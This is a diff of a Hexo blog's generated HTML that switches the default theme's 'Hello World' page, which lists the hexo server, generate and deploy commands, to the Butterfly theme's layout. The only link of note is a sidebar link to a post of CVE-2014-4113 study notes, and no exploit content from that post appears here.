-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/26/hello-world/" data-id="cli4qu7t1000070ti0xxdf4v3" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/05/31/CVE-2014-4113%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/05/26/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2023 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+More info: Deployment
+</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2023/05/31/CVE-2014-4113%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="No title">No title</a><time datetime="2023-05-30T16:26:59.203Z" title="Created 2023-05-31 00:26:59">2023-05-31</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2023/05/26/hello-world/" title="Hello World">Hello World</a><time datetime="2023-05-26T15:41:34.729Z" title="Created 2023-05-26 23:41:34">2023-05-26</time></div></div></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">May 2023</span><span class="card-archive-list-count">2</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">2</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Push :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-05-30T16:51:00.437Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
